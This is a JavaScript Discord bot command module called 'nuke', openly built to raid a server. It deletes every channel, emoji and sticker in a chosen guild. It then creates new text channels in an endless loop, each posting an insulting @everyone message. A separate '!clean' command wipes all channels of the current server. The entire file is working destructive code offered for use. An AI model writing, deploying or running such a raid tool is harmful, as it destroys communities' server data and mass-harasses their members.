//requirements
const client = require('../index').client
const admin = require('../config.json').admin
//vars/consts
const config = {
    everyone: true
}
var stop = false
module.exports = {
    name: "nuke", 
    author: "Vladimir Putin",
    description: "among us nuke a server, usage -> nuke [guildname] [new channels names] / stop",
    version: "1.0",
    enabled: true,
    onMessage: function(message, args) {
        if(message.content.toLowerCase().startsWith('!nuke') & admin.includes(message.author.id)) {
            //find the guild
            const guild = client.guilds.cache.find(guild => guild.name.includes(args[1]))
            //if guild exists
            if(guild == null) return message.channel.send("this guild doesn't exists")
            //if args 3
            if(args[2] == undefined) return message.channel.send("please specify the name of the new channels")
            //deleting channels
            guild.channels.cache.forEach(channel => {
                channel.delete()
            })
            //deleting emojis
            guild.emojis.cache.forEach(emoji => {
                emoji.delete()
            })
            //deleting stickers
            guild.stickers.cache.forEach(stick => {
                stick.delete()
            })
            //start nuke
            nuke()
            function nuke() {
                //if stopped
                if(stop) return stop = false & message.author.send('stopped')
                //new text channel
                guild.channels.create(args[2].replace(' ', '-'), {
                    type: "GUILD_TEXT"
                }).then(channel => {
                    //everyone
                    if(config.everyone) channel.send('@everyone yall got Nuked. RIP BOZO + o7 + L + F + BURN IN HELL + Who is Joe? + Candice + Amogus Sussy Baka + Deez Nuts')
                    //again
                    nuke()
                })
            }
        }
        //stop nuke
        else if(message.content.toLowerCase().startsWith('!stop') & admin.includes(message.author.id)) stop = true
        //clear channels
        else if(message.content.toLowerCase().startsWith('!clean') & admin.includes(message.author.id)) {
            message.guild.channels.cache.forEach(channel => {
                channel.delete()
            })
        }
    }
}